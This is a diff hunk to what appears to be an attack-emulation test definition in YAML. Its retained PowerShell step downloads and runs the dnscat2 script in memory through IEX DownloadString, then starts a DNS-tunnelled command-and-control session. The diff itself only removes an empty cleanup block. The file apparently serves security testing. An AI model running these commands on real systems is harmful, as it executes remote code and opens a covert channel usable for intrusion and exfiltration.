@@ -31,6 +31,3 @@ steps:
         IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
         Start-Dnscat2 -Domain {{.Args.domain}} -DNSServer {{.Args.server_ip}}
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
